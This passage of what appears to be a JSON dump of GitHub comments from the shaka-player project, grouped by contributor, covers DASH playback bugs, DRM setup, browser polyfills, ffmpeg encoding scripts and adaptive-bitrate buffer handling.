for letting it slip.. @dulmandakh This sounds like you are running into this issue here: https://github.com/electron/electron/issues/6516. O, I see. I understand why it's returning so many tracks now.\nI still think that this is going to cause interim problems. getTracks() has been deprecated and will be removed in 2.2. But because the track objects have changed already, this will be a breaking change before version 2.2. If anyone is relying on type being audio or video then these changes will cause problems before 2.2 is released. . Sorry, I just re-read your comment and I see that you mentioned the deprecation is wrt to the method deprecation and not the track structure change. Which release is the track structure change going to go in?  . Would you be able to provide some additional context as to why the inclusion of HLS necessitates this change to tracks? AVPlayer specifies tracks as audio or video and allows selecting them independently so it's not clear to me that this is a requirement of HLS.. Great, thanks very much for the context. It's very helpful.. If you guys are happy with these changes, can we merge this?. Okay thanks that makes things a lot clearer.\nYou can use this test stream: http://demo.yospace.com/quickplay/dash/vod.mpd. I believe this issue has now been resolved. We were told by Google that the UAT environment issue has been corrected and I can play Widevine content in Canary (59) through the sample app. \nMy question is whether this requires client side code changes. The Shaka sample code that was provided by the Widevine team shows how to configure the certificate. Is this required only to avoid extraneous requests? I.e. if we do not configure anything, playback won't break, but it will require a certificate request prior to playback of each piece of content? It's unclear to me where we should be getting this certificate from so that we can configure it on the player.. I'm not sure I'm following completely. What do you mean take an instance of Restrictions from the caller?\n. I like this idea. But just with respect to the issue below of replacing struct on Restrictions, the way I would like to implement the clone() method would be similar to this because rather than explicitly setting each property because then there is no need to modify this method if new restrictions are added at some point. This will prohibit me from replacing struct, even if the changes below are made. Am I right about this?\n. Okay, on rereading it I think I was being a real space cadet. I see what you're saying.\nBut I think I still have the same question as I initially did. What if this happens?\nvar r = player.getRestrictions();\nr.maxHeight = someNumber;\nplayer.setRestrictions(r);\nThen I've overidden the restrictions that are supposed to be set by the manifest, no?\n. O, okay, I see. I was misunderstanding how these height & width restrictions were getting set.\n. The reason I added these checks was to be consistent with methods such as setPlaybackRate() above. Because these restrictions can be set at the application level, I don't see what's preventing someone from passing in an object literal which will then cause problems if they try to getRestrictions().\n. Alright, good call. Just to be clear, is the suggestion to remove the assert and instead throw an exception? Or through an exception as well? \n(I appreciate the feedback since, as I mentioned, I'm not familiar with closure compiler. I'm enjoying learning about it.)\n. Okay, I've changed to a no-op. \n. I was unsure about this and wanted feedback. I thought it might be desirable for all users to get this warning since deprecating this will affect users whether they are using the default setting or not. But if that seems like overkill than I can put that second condition back in.\n. Okay, will do. \n. I had that but it failed. \n. Not that I can see. Happy to change it if people prefer it that way.\n. Strictly speaking it's not actually replacing tags. How about \"Insert '\\n' characters into  tags\"\n. Just re ran the build and looked more closely. The issue is that because this function calls itself to drill down and find nested tags, the nested nodes are not guaranteed to be elements. Initial call is always !Element but subsequent calls are not guaranteed.\n/Users/sanbornh/Documents/shaka-player/lib/media/ttml_text_parser.js:223: ERROR - actual parameter 1 of shaka.media.TtmlTextParser.addNewLines_ does not match formal parameter\nfound   : Node\nrequired: Element\n      shaka.media.TtmlTextParser.addNewLines_(childNodes[i]);\n. I'm not familiar with the problem we are attempting to solve here. Can you describe why it is important to be using elements instead of nodes?\n. Okay, thanks, I appreciate the explanation. Will update.\n. Shoot, good catch. Will update.. I rolled this into a single test because I thought it would be sufficient but I can separate the single Representation case from the multiple Representation case if you'd prefer.. I could return true there and return false at the end of the function but I was trying to avoid so many return statements so I handled it with one return at the end of the function. . ",
    "Awais-cb": "this is the way of checking if abr is enabled or not\n\nshakaPlayer.getConfiguration().abr.enabled\n\nit returns true or false accordingly.. any answer to that would be really appreciated! . hey @joeyparrish i fixed it using\nvar currentRes = 'Adaptation: ' + shakaPlayer.getStats().width + \"x\" + shakaPlayer.getStats().height;\nplease let me know if this is the right way btw thanks for your response much appreciated.. no sir not for now thanks for this awesome open source project. ",
    "palmerj3": "I've created a PR for this feature - please review when you have the chance. Thanks!\nhttps://github.com/google/shaka-player/pull/35\n. No worries thanks!  Any idea when these latest changes will be published to NPM?\n. Ok cool thanks!  I've submitted a separate PR for the CONTRIBUTORS and AUTHORS update.  https://github.com/google/shaka-player/pull/37\n. @sanbornhnewyyz I think instead of us supporting all possible async dependency resolution solutions you could utilize webpack or something like this within your project which would allow you to utilize CommonJS, RequireJS, etc dependencies interchangeably.\nSounds similar to what you've already done but perhaps take a look at:\nhttp://requirejs.org/docs/api.html#cjsmodule\nFor me the way I'm using it is:\nvar shaka = require('shaka-player').shaka;\nshaka.polyfill.Fullscreen.install();\nshaka.polyfill.MediaKeys.install();\nshaka.polyfill.VideoPlaybackQuality.install();\nvar player = new shaka.player.Player(myVideoDomNode);\nvar playerSource = new shaka.player.DashVideoSource(mpdUrl, null);\nplayer.load(playerSource);\n. @sanbornhnewyyz I spoke too soon... so I was able to get it working but I'm not sure it would be wise to include in the main build... @joeyparrish would like your thoughts.\nIt's not ideal because it's tying the build process to specific implementation details (e.g. shaka.player, shaka.polyfill, etc). But it works... perhaps it's useful to you.\nIf you add this to build.sh:\n(library_sources_0; closure_sources_0) | compile_0 \\\n  --output_wrapper='%output% define({player: shaka.player, polyfill: shaka.polyfill, util: shaka.util});' \\\n  --js_output_file \"$dir\"/index2.js\nIn this case \"index2.js\" will define all the AMD stuff needed so you can do something like this:\n```\n(function() {\n  'use strict';\nrequire(['node_modules/shaka-player/index2'], function(shaka) {\n    shaka.polyfill.Fullscreen.install();\n    shaka.polyfill.MediaKeys.install();\n    shaka.polyfill.VideoPlaybackQuality.install();\nvar player = new shaka.player.Player(document.getElementById('foo'));\nvar playerSource = new shaka.player.HttpVideoSource('http://video.webmfiles.org/elephants-dream.webm');\nplayer.load(playerSource).then(function() {\n  player.play();\n});\n\n});\n}());\n```\n. @joeyparrish @sanbornhnewyyz I created this - let me know your thoughts.  https://github.com/google/shaka-player/pull/55\n. Not yet. Will likely be published at the end of the month I've been told. In the meantime I you can run ./build/all.sh and utilize the index.js generated file in your project. This file will export all the classes you need.\n. I believe so.\nI'm in a similar boat with my project. For now I have just created a \"vendor/shaka-player\" folder in my root dir and placed the compiled index.js there.\nOnce the NPM dependencies are available I'll swap that out with a normal node_modules include. Not ideal but works fine.\n. :+1: \n. @sanbornhnewyyz so in my project I am actually utilizing both the HTTP source and the DASH source but switching them based on the content.  Both are working fine for me in a CommonJS environment.  I'll do a bit more testing to see if there are any obvious issues in a AMD environment but from my local testing I don't see any of the errors you mention when playing back Dash content.  However that content I'm playing is not DRM'd so perhaps that's a code path I haven't tested yet in AMD or CommonJS. Is that a requirement for your project?\nAt this point I'm wondering if perhaps shaka is being garbage collected in your environment... Are you able to create an outside-the-closure reference to test this out?  I'll do some more testing later and see if I see any issues myself.\n. Just tried out the latest master with these MPD samples:\nhttp://dash-mse-test.appspot.com/media.html\nAnd it doesn't seem to be working. Works fine with HttpVideoSource however the DashVideoSource is giving me a few errors:\n1. Refused to get unsafe header \"Date\"\n2. TypeError: Cannot read property 'addEventListener' of undefined {stack: (...), message: \"Cannot read property 'addEventListener' of undefined\"} ---> line 12 of compiled file\nAny ideas?\n. Ok will try that. In the future would be good to increment the major version for breaking API changes.  Until now I've passed null in as the second param and it worked fine - perhaps that wasn't supposed to be the case?\n. Sorry to re-open this but has this been published to NPM?  Using 1.3.0 http video plays right away after calling \"load\" in both cases when the \"autoplay\" attribute is missing and when autoplay=false.\n. Cool thank you. As of now I'm still using shaka as a pre-compiled include in my project instead of an NPM dependency.\nIdeally I would prefer seeing a release schedule that's more iterative where all resolved issues are published. Especially for non-breaking changes it seems very low risk to do so.\nIf there is any way I can help with this please let me know and I would be thrilled to lend a hand.\nThanks again for all you do - much appreciated\n. ",
    "nickdesaulniers": "hmm, angel one doesn't seem to have Cues elements either.\n. @joeyparrish , can you reproduce, with this input file and script:\nhttps://www.dropbox.com/s/vw0y6823y6ih5z3/short.mp4?dl=0\n```\nFILE=short.mp4\nVP9_DASH_PARAMS=\"-tile-columns 4 -frame-parallel 1\"\nffmpeg -i ${FILE} -c:v libvpx-vp9 -s 160x90 -b:v 250k -keyint_min 150 -g 150 ${VP9_DASH_PARAMS} -an -f webm -dash 1 video_160x90_250k.webm\nffmpeg -i ${FILE} -c:v libvpx-vp9 -s 320x180 -b:v 500k -keyint_min 150 -g 150 ${VP9_DASH_PARAMS} -an -f webm -dash 1 video_320x180_500k.webm\nffmpeg -i ${FILE} -c:v libvpx-vp9 -s 640x360 -b:v 750k -keyint_min 150 -g 150 ${VP9_DASH_PARAMS} -an -f webm -dash 1 video_640x360_750k.webm\nffmpeg -i ${FILE} -c:v libvpx-vp9 -s 640x360 -b:v 1000k -keyint_min 150 -g 150 ${VP9_DASH_PARAMS} -an -f webm -dash 1 video_640x360_1000k.webm\nffmpeg -i ${FILE} -c:v libvpx-vp9 -s 1280x720 -b:v 1500k -keyint_min 150 -g 150 ${VP9_DASH_PARAMS} -an -f webm -dash 1 video_1280x720_500k.webm\nffmpeg -i ${FILE} -c:a libvorbis -b:a 128k -vn -f webm -dash 1 audio_128k.webm\nffmpeg \\\n  -f webm_dash_manifest -i video_160x90_250k.webm \\\n  -f webm_dash_manifest -i video_320x180_500k.webm \\\n  -f webm_dash_manifest -i video_640x360_750k.webm \\\n  -f webm_dash_manifest -i video_640x360_1000k.webm \\\n  -f webm_dash_manifest -i video_1280x720_500k.webm \\\n  -f webm_dash_manifest -i audio_128k.webm \\\n  -c copy -map 0 -map 1 -map 2 -map 3 -map 4 -map 5 \\\n  -f webm_dash_manifest \\\n  -adaptation_sets \"id=0,streams=0,1,2,3,4 id=1,streams=5\" \\\n  manifest.mpd\n```\nI'm curious now if this is a bug in ffmpeg mpd generation, webm generation, or I'm doing something wrong?\n. nvm! user error, missed a damn \\ for the shell script!  I was doing something stupid, thanks for your time.\n. Interestingly, I now get this error for 2 of the 5 different resolutions, but if I re-encode I get something different.\n. @joeyparrish , if you have time, could you look at this again?  I've worked on improving my reported steps to reproduce.  If you clone this repo: https://github.com/nickdesaulniers/mpd-dash\nSTR:\n1. git clone https://github.com/nickdesaulniers/mpd-dash.git && cd mpd-dash\n2. ./download_source.sh\n3. ./test.sh, wait for transcodes to finish, takes about a minute on mid-2012 MBP\n4. serve shaka player from localhost, browse to it\n5. change test manifest to custom\n6. set custom manifest url to served manifest.mpd file\n7. click load stream\n8. right click on video, check Loop (otherwise video is too short, 10s)\n9. click cycle video tracks\nExpected:\nPlayer to cycle through various streams.\nActual:\nNumerous CuesElement does not exist. errors, sometimes stream doesn't start when clicking loading stream, but will after subsequent clicks without page reload.  Only the 320 x 180 stream loads and plays.\nThis is testing with Opera Beta 29.0.1795.21, and ffmpeg version 2.5.2.\n. because there are so many dependencies, I'm not sure if this is a bug in:\n- how I'm using ffmpeg, starting with a mp4 -> webm\n- how the webm page instructs you to use ffmpeg for generating mpd's.\n- ffmpeg's mpd generator\n- ffmpeg's webm encoder\n- ffmpeg's mp4 decoder\n- shaka's CuesElement parser\n- Opera/Blink's MSE implementation\n. @joeyparrish , here's the folder: https://www.dropbox.com/sh/kmk5nhwj824xy6q/AAADCZ_zpiWkxpxZ79yDyyxAa?dl=0.  What version of ffmpeg are you using?  I'm not building ffmpeg from source, just installing from homebrew (rather, homebrew might be building from source.  I don't think they maintain mirrors to prebuilt binaries).\n. Interesting, broken in Opera Beta 29.0.1795.21 but not Chrome 43.  Chrome 41 throws an error but continues playing.\n. unbelievable, switching the static file server did the trick.  I was using python -m SimpleHTTPServer, now I'm using this and not seeing any issues.  If you can repro (should have python on linux), maybe it would be worthwhile to add a note to the readme that python's simpleserver has issues?\n. Thanks for you assistance @joeyparrish , I appreciate it!\n. > Is the problem that you only have one track to choose from, or that it never switches? Which track does it play?\nI only have one choice of track: 640x360 656625 bits/s\nTested in Opera beta 30.0 and the hosted demo: http://shaka-player-demo.appspot.com/.  Will try downloading a debug build.\n. With a local build of v1.3.0-debug, same thing; just one track, no errors in the console.  Would sharing my assets be helpful?\n. assets + console log (18MB): https://www.dropbox.com/s/d8h1h1pnbfsdaj9/assets.zip.gz?dl=0\nthere's an error about the cors header in there, I don't think that's the problem, has to do with my server I'm using, see: https://github.com/indexzero/http-server/pull/157#issuecomment-110910350\n. sorry, this does work in Opera.  Other issues in other browsers such as #101.  will file other issues.\n. More info logged to the console from a local build of v1.3.0-debug:\n```\nEME not available. mediakeys.js:55:5\n+ audio/mp4; codecs=\"mp4a.40.2\" is supported player.js:178:3\n+ video/mp4; codecs=\"avc1.42E01E\" is supported player.js:178:3\n+ audio/mp4; codecs=\"mp4a.40.2\" is supported player.js:178:3\n+ video/mp4; codecs=\"avc1.42E01E\" is supported player.js:178:3\nInitial seek range Array [ 0, 61.318 ] dash_video_source.js:159:1\nStarting each stream from 0 stream_video_source.js:1112:3\n stream_video_source.js:863:1\nPlayer error error { target: null, isTrusted: false, detail: InvalidStateError, eventPhase: 0, bubbles: true, cancelable: false, defaultPrevented: false, timeStamp: 1434139288126345, NONE: 0, CAPTURING_PHASE: 1, AT_TARGET: 2 } app.js:892:3\n```\n. The call stack looks like:\napp.onPlayerError_ app.js:892\nshaka.util.FakeEventTarget.prototype.recursiveDispatch_ fake_event_target.js:145\nshaka.util.FakeEventTarget.prototype.dispatchEvent fake_event_target.js:123\nshaka.player.Player.prototype.load player.js:313\nsetting a breakpoint at app.onPlayerError_ app.js:892, stepping up the call stack to shaka.player.Player.prototype.load player.js:313:\nerror.message is \"An attempt was made to use an object that is not, or is no longer, usable\"\nerror.filename is \"http://localhost:8002/lib/player/stream_video_source.js\"\nerror.lineNumber is 1113\nlib/player/stream_video_source.js:1113 is this.video.currentTime = streamStartTime;.\nsetting a break point there, streamStartTime is 0 and this.video.currentTime is also 0, and triggers the exception in Firefox.\nThis is equivalent to document.createElement('video').currentTime = 0 in Firefox (also triggers an invalid state error).\n. >  Is the problem that we're setting currentTime too early (while the HTMLVideoElement is in the wrong state)\nThis seems to be the case, but I work in blissful ignorance a few levels up from the media stack so I'm not really sure why this is considered an error in Firefox.  Maybe \"defer\" is not the right term, feel free to reword the commit message manually.  Also, I'm not sure if this breaks seeking; I would guess not, since that conditional predicate should be true.\nIt would be better to have the predicate be if state is ready then assign time to zero, but I'm not sure how to check the state of a media element to see.  There's probably some constant on the MediaElement prototype that VideoElements inherit from, but didn't see any likely candidates to check in my admittedly brief look through the attributes.\n. > if state is ready then assign time to zero, but I'm not sure how to check the state of a media element to see.\n\nyou could first check if videoElement.readyState is > 0\n\nheh, funny I missed that.\nI'll rewrite my patch.\n. Instead of > 0, there's const enums:\nHTMLMediaElement.HAVE_NOTHING\nHTMLMediaElement.HAVE_METADATA\nHTMLMediaElement.HAVE_CURRENT_DATA\nHTMLMediaElement.HAVE_FUTURE_DATA\nHTMLMediaElement.HAVE_ENOUGH_DATA\nso I think videoElement.readyState > HTMLMediaElement.HAVE_NOTHING is the way to go.\n. We definitely don't have WebM support in our MSE implementation.  Asking in irc.mozilla.org#media about mp4/h.264/Linux support now...\nIn 41.0a1 (2015-06-26), and 42.0a1 (2015-07-01) I continue to get the InvalidStateError, but not in 40.0a2 (2015-06-29) (where it works).\n. Hi @joeyparrish , thanks for this great feedback; I'll have to defer to @cpearce , as I don't work on implementation.\n. https://bugzilla.mozilla.org/show_bug.cgi?id=1217923\nIn the meantime, I've been successful in live streaming content using GPAC's DashCast, http-server, FF 44, and shaka-player (commenting out the line assigning to this.video.currentTime).\n. I filed a bug with Chromium just in case.\nhttps://code.google.com/p/chromium/issues/detail?id=547207\n. wtf: https://github.com/photonstorm/phaser/issues/1355 Develop > Clear caches\n. ready for rereview @joeyparrish \n. rereview? @joeyparrish \n. rereview? @joeyparrish , double check the annotations, I've never written them before.  Guessing they're used for closure compiler.\n. made use of EventManager.  rereview? @joeyparrish \n. @joeyparrish , done.  rereview?\n. No problema, about to hop a plane for a company work week, but I'd like to see this project working in FF, even if I have to write the patches.  Will take a look later.\n. It seems poor that an MSE implementation would invalidate everything because of one source buffer having a decode error.  So I guess we should see if the decode error is thrown by append SourceBuffer.prototype.appendBuffer and if that can be caught/recovered from.\n. As in, it seems like the logic \"this one source buffer is bad, therefore, let's invalidate all previous valid buffers\" seems incorrect.\n. >  Besides, if the content is fundamentally broken, shouldn't that be a bug on the software creating the content?\nAbsolutely.  Could it ever be the case that only part of the file was transferred (maybe chunked encoding) that prevented proper decoding? \n\nHave you reported the bug to gpac?\n\nhttps://github.com/gpac/gpac/issues/297\nIt might be useful to log which URL/segment triggered the invalid state, but it sounds like the HTMLMediaElement does not provide this info.\n. @cpearce, does this sound correct, that this use case can't be supported?\n. or maybe @jyavenard can add some thoughts?\n. this.video.rEL!\n. ",
    "dansanders": "It's worth noting that the ideal behavior is to always fill in these lists, since it is not a good user experience to fail to play media after calling requestMediaKeySystemAccess(). (requestMediaKeySystemAccess() could initiate a user prompt or download a CDM, for example.)\n. ",
    "jonoblinkbox": "Ah sorry Joey, I had missed #45 - we'll upgrade to 1.2.3 as soon as we can. Thanks\n. ",
    "jbroberg": "Hi guys.\nYou might enjoy this:\nhttps://github.com/MetaCDN/videojs-shaka-player\nComments/feedback appreciated.\n-James\n. Thanks - link sent via email.\n. Looks like this issue was trigged on Shaka > 1.3.2 with the following property set (which was done for dash.js compatibility - https://github.com/Dash-Industry-Forum/dash.js/issues/600):\n<Property>\n                                        <Name>mpegdashStrictSpecComplianceForAST</Name>\n                                        <Value>true</Value>\n                                        <Type>Boolean</Type>\n                                </Property>\nShaka v1.5.0 now works when I remove this property from my application.xml in Wowza. I do get the following warning in my console but playback seems ok.\n@availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 941.0050001144409 latestAvailableSegmentEndTime 956461.577\nlive_segment_index.js:218 \n@availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 941.0050001144409 latestAvailableSegmentEndTime 956461.5817006803\n. ",
    "somerobmitchell": "Hi Guys,\nMy company would like to see this as well. We have extra information we need to send to the license server in the body of the request.\nHaving a hook similar to the post-processor would be ideal and we would only need to alter the body, the content type of the body (we use json not an array buffer) and the headers. \nIn our workflow it would not be necessary to alter the url after the content protection has been interpreted.\n. I also got clear dash playback on IE11 / windows 8.1.\nI am still adding a polyfill for the promises, was using an external js file as a poc. I did not have to add any other polyfills to the project. I just called shaka.polyfill.installAll(); when initialising the player.\nI haven't changed the elem.children. This has not caused an issue for me. What errors did you see?\nInstead of commenting out the line this.video.currentTime = this.streamStartTime_; I added an event listener to the video object and set the currentTime when loadedmetadata fired as per here.\nI had no issues seeking. I have not tried it with the shaka manifests as I was using my companies own content.\nMy next target, after I get the promise polyfill completed is to playback PR encrypted streams.\n. I am leaning towards removing the code. We are using the dash.js player as well and have not seen any problems with not having the cache buster. \n. relevant issue also on dash.js github: https://github.com/Dash-Industry-Forum/dash.js/issues/1676. @joeyparrish Thanks for testing. Sorry I should have put IE versions on the original comment. \nI am using IE 11 version 11.0.9600.18525, update version 11.0.37.\n~~I have not asked Microsoft for support. Do you have a suggested place to raise a ticket with them?~~. @joeyparrish I have raised a ticket on the Microsoft Connect portal: https://connect.microsoft.com/playready/feedback/details/3114305. ",
    "chrisleighton11": "Curious if IE11 is supported for clear dash.  We have played around with poly filling promise and customevent with no luck.  The console is showing errors when parsing the mpd.\n. ",
    "baseballbrad3": "I was able to get Internet Explorer 11 on Windows 8.1 to play back a DASH manifest. It wasn't perfect, but it's a start. Here's what I did.\n- Got the latest Shaka from npm \"npm install shaka-player\" (currently v1.3.0)\n- Added promise polyfill - https://github.com/taylorhakes/promise-polyfill\n- Added CustomEvent polyfill - https://github.com/krambuhl/custom-event-polyfill\n- Added document.currentScript polyfill - https://gist.github.com/JamesMGreene/fb4a71e060da6e26511d\n- Changed all elem.children to elem.childNodes in lib/dash/mpd_parser.js\n- Commented out this.video.currentTime = this.streamStartTime_; in lib/player/stream_video_source.js\nI used the \"Car (YT DASH test) - MP4\" test manifest. It does adaption, but seeking is broken (which is why I think we needed to comment out the setter of currentTime). Chrome still worked like it did before.\nIt's very much a proof of concept. Also, I didn't try playing an encrypted file as I don't have a PlayReady license server setup.\n. Hey Joey,\nShaka v2 sounds great. We'll be sure to give that a shot when we get some time. I'm glad that this has already been addressed in v2.\nThanks for the reply!\n. Hey Joey, we're just now getting Shaka v2 implemented and I noticed a slight issue with IE/Edge's implementation of TextTrackCue. We have some poorly formatted subtitles that would appear to have the same start and end times (or a duration of zero). When IE/Edge try to create a new TextTrackCue, the object creation throws an exception of \"Syntax Error\" and halts all playback. \nNow, we certainly are to blame for the malformed VTT track, but I was wondering if it'd make sense to check that end > start prior to creation of the Cue. Since, in our case, the duration is zero and it'd never show up (even if the Cue was created correctly), we could simply skip the creation. Alternatively, we could wrap the ret = new TextTrackCue(start, end, payload); in a try/catch that doesn't halt playback if the creation fails.\nWhat do you think? I'd be happy to create a pull request for the change. On the surface, this seems simple enough.\n. Oh we'd absolutely like to fix them, and (long term) we plan to, but unfortunately for us, it's difficult to go back and fix them. Some of our content lives in environments that don't have internet connections. Entirely selfish, I know. Also, we'd certainly be more proactive than waiting for complaints when detecting the bad subtitles.\nFrom a user's perspective, if a video was unplayable, I'd be pretty upset. If a line here and there were dropped from the subtitles, I'd be a bit confused but would be less impacted. Certainly having some log messages when the subtitle is loaded would help identify the problem when a complaint came in.\nWe'd likely need to fork the repo until we were certain we got all the bad subs replaced.\nBy the way, a little background on how we got into this situation: we use pycaption to convert TTML to VTT and somehow, it dropped all the milliseconds from the output (even though the sources had it). I'd have to look at the conversion to see what was wrong. It's possible we're not the only ones in this boat.\n. ",
    "jonoward": "Hey guys, we're interested in getting IE11/Edge to work with PlayReady protected content; I gave it a try after using the above work-arounds (thanks!). It fails because Shaka selects the no-op polyfill for MediaKeys (shaka.polyfill.PatchedMediaKeys.nop). \nI think IE implements a different version of the EME spec compared to the latest and the older v01b - I believe it's this one - http://www.w3.org/TR/2014/WD-encrypted-media-20140218. So it may be possible to write a new polyfill for this implementation, but really I don't know how similar/different they are, or if this is possible. I'll spend a bit of time investigating...\n. So I've spent a bit of time trying to implement a polyfill for EME spec v20140218, and did manage to get a very rough version working with our real PlayReady protected media. It's still a long way from a PR, but feel free to have a look at this commit:\nhttps://github.com/blinkbox/shaka-player/commit/79a80f06640be1fbcc59c4f593fd0e9734d8f4ec \nA couple notes:\n1. Will need a Promise polyfill for IE11 (Edge has support) - would you want to include an external dependency for this (e.g. Q) or add a custom implementation?\n2. In IE11, creating a CustomEvent is causing an issue (even when it's been replaced on the window object); the target property is always null no matter what you do. One of the event handlers in eme_manager expects event.target to be set, so playback failed to start. Have added in a hack for now (added a \"customTarget\" property that eme_manager looks for in addition to \"target\"), but it's not a real solution. Again, Edge supports CustomEvent properly.\n3. setMediaKeys can't be called on the video element before it's initialised (i.e. readyState == 0), so am having to defer to the loadstart event (but not blocking the Promise resolution, as nothing would load, so bit of a catch-22) - think this creates a race condition somewhere, as playback doesn't start about 20% of the time (but no errors).\n4. In eme_manager, added a built-in license pre-processer for PlayReady, as it would require everyone to add in the same code in their own pre-processor. What do you think?\n. @joeyparrish \n1. Thinking about it, maybe option 1c is not unreasonable? I'm happy enough providing my own polyfill for older browsers. Is there a place where browser support is validated so that maybe a helpful error message is thrown if window.Promise is not available?\n2. I've managed to get CustomEvent.target working with seperate Object.defineProperty calls rather than a single Object.defineProperties - I don't know why IE doesn't like Object.defineProperties, possible bug. In IE, event.target was always null, even if the preceding line set it to a non-null value, weird! See this commit https://github.com/blinkbox/shaka-player/commit/8de489c535fc97e0da3b907ffba07c4a6d53112c - do you think this is a suitable work-around? Not widely tested, but works in Chrome and IE\n3. Currently we're deferring the native videoEl.msSetMediaKeys to the loadedmetadata event, within the custom implementation of setMediaKeys in the new polyfill. This does seem to work, but I do think it's caused a race condition somewhere, as playback is still a little bit flaky, and I think this is one area where the order of execution could be varying. But I'm still working on this.\nCheers\n. Yeah that's pretty much it, when switching to a higher quality we want to switch as soon as possible (so retain just enough buffer in front of the playhead to avoid a rebuffer), but when switching to a lower quality, we may as well play out the buffer (which should be filled with better quality media), so we don't discard any of the buffer, and we append new fragments to the end of the buffer.\n. Yes that would work, if we could instruct SBM to forget about all the segments X seconds in front of currentTime, and only apply this rule when upshifting to a higher quality bitrate, that would work for us. Not sure what the value of X should - would probably be ok to be a constant value, e.g. 5-10 seconds, just needs to be a long enough period to download the new initialisation segment and at least one other segment. \n. Hi Joey, sorry for the long delay in responding, we're just starting our migration to 1.4 now. I've been looking at your suggestion; do you think it would work for us to leave selectVideoTrack as-is (so no signature change) but also add additional clearVideoBuffer/clearAudioBuffer methods on StreamVideoSource, which we could then use in our custom AbrManager, after we have changed track? I'm happy to submit a PR for the additional methods.\nSo the pseudo-code in our custom AbrManager would look like:\nvideoSource_.selectVideoTrack(chosen.id, false); // same as in SimpleAbrManager, buffer not cleared\nif (isNewVideoTrackHigherBandwidth) {\n   this.videoSource_.clearVideoBuffer(video.currentTime + 10, Number.POSITIVE_Infinity);\n}\nThanks\n. Yeah I think this will be fine for what we need to do, we don't need to create a gap, we do just want to clear the buffer after a certain time position. Also, aligning to the nearest segment boundary is fine for us. Thanks.\n. Hi @tdrews, I've been working on this change, but have been running into some co-ordination issues in Stream + SBM; I'm trying to use a similar flow to Stream.resync in implementing the new Stream.clearBuffer method:\n1. cancelUpdateTimer_()\n2. sbm.abort()\n3.  - then smb.clearAfter(video.currentTime + offset) /* New method on SBM*/\n4.     - then setUpdateTimer_(0)\nBut the issue is that I'm ultimately calling this some time after StreamVideoSource.selectVideoTrack, which means the fetching process in onUpdate is underway and I think there is race-condition between SBM.fetch and SBM.clearAfter. Assuming I can fix this, do you think this general approach is right? Here is what we've done so far (on our fork): https://github.com/blinkbox/shaka-player/commit/1327efeb43ff492a807a3299ed3d795772175c9b\nAn alternative is not to SBM.abort(), but simply to remove the entries from the inserted_ list, which causes fragments to be downloaded from that point (meaning that the actual data isn't removed from the native SourceBuffer, but merely replaced later on). It's simpler to do this, but feels a bit of a short-cut.\n. Yup re-using resync with an additional \"offset\" param is cleaner. But I still get the same issue - it's a failed assertion at the top of resync():\nshaka.asserts.assert((this.updateTimer_ != null) || this.fetching_);\n/* this.updateTimer is null and this.fetching_ is false */\nI think this is happening because I'm coming into resync after calling StreamVideoSource.selectVideoTrack which at some point cancels the update timer, so I think I'm calling resync during the switch, which I think is the race (if I delay the clearing by a short delay it doesn't happen). If selectVideoTrack returned a promise I could chain this to ensure the order. It looks like this could be possible, as the main method it uses - Stream.switch could probably return a promise (but the deferredSwitches could be tricky). \nBut this seems quite a large change, so another way for me to do it would be to do the buffer clear before calling StreamVideoSource.selectVideoTrack, which I think will work.\n. These are being called in the middle of playback (when bitrate is being switched). Can also confirm that calling clearBuffer before selectVideoTrack does work without the assertion failing. But to your final point, yes it may be easier to wrap up the offset logic within the call to selectVideoTrack, which probably would avoid the race. I think the original idea was from Joey (see higher up on this thread) to split up the buffer clearing and switching, to avoid making selectVideoTrack too complicated, but given these issues maybe it's worth a shot? I'll try this out, will let you know how it goes.\n. Just for comparison sake, I've got a branch that adds \"offset\" as a parameter onto IVideoSource.selectVideoTrack, which in turn passes that down to Stream.switch: https://github.com/blinkbox/shaka-player/commit/486f04913f77300cc92783c77fc0cdc28db6da68\nWhat do you think? You might be wondering why I made those changes to SimpleAbrManager; this was just to allow us to easily customise the parameters for videoSource.selectVideoTrack, in a custom ABR manager; i.e. I'm inheriting from SimpleAbrManager and changing just the selectVideoTrack method. \nAnd in terms of your other suggestion, i.e. to get resync() to avoid restarting the timer, I wasn't too sure how to go about this, because if the timer is not started in resync, I can't see where it would be restarted again?\n. Nope I haven't come across any races in the approach as yet. I've got a PR I'm about to submit, so let me know what you think, and whether we should investigate the separate clearAhead/switch approach some more. Thanks\n. We selected a timeout value that is basically a fail-safe, more to catch out slow requests caused by CDN issues (so they can be retried quickly), rather than trying to match it too closely with the expected download times of our clients. Our segments are 2s long, our timeout 8 seconds, our top bitrate around 4.5mbps, so this means a user who is on the top bitrate will experience timeouts if their bandwidth drops to around 1.2mbps. So thinking about it, maybe we should make this a little longer, perhaps 10 seconds.\nOne alternative idea, if you want to avoid exposing IAbrManager to network issues - perhaps allow ABR manager to determine the buffer size, so that the buffer stops growing, and it's starting to get low (perhaps X% of the buffering goal), the ABR manager could drop down a bitrate(s) as a fail-safe to try avoid a rebuffer. I haven't thought this through completely, so there could very well be a reason why this is a bad idea.\nOne last thing, how hard do you think it would be to cancel XHR retries when the bitrate changes? Currently, even if ABR manager does switch bitrates, utill.AjaxRequest is still going to keep retrying, it will only be when those are exhausted and the retries in Stream.onUpdate fire, will the new bitrate be picked up. It's not necessarily a major problem, but might be nice to exist those retries earlier (should further reduce the chance of a rebuffer).\nThanks for your help on this, I'll wait until your #51 changes come up to see if all of this is still an issue, and we'll look at raising our timeout a little bit. \n. That sounds great, if we were able to implement a custom ABR manager that had access to the videoElement/SourceBuffers, we could implement a fix for the original issue by dropping to the lowest bitrate when the buffer is about to run dry. For us, dropping quality is better than rebuffering (well, less bad), but def agree that frequent bitrate changes are a bad user experience. And thanks for the tip about sbm.abort(), we'll take a look at that\n. Ah yes we had this exact issue in IE - it doesn't like certain operations being called before the video has metadata (calling msSetMediaKeys had the same issue).\nOur change was to set currentTime within a handler for loadedmetadata. But to be really robust, you could first check if videoElement.readyState is > 0, if so, set current time immediately, else defer to loadedmetadata. Hope that helps!\n. Just to add some additional info to this thread, it seems only IE11 raises an InvalidStateError when the current time is set when video.readyState is HTMLMediaElement.HAVE_NOTHING; Edge has the same behaviour as Chrome, and allows it (assume it defers it internally, as at this point the duration is not yet known by the video element, so it shouldn't be able to set it's currentTime). \nAlso, with the recent changes to add player.setPlaybackStartTime for initiating playback at a non zero currentTime, the invalid state error only happens if you use this method (in IE11, and I assume FF)\n. Great, thanks @tdrews, this resolves the issue for us\n. Hi @tdrews, I've updated the branch with the suggested changes (have squashed the commits, not sure if you prefer that or not?), with the 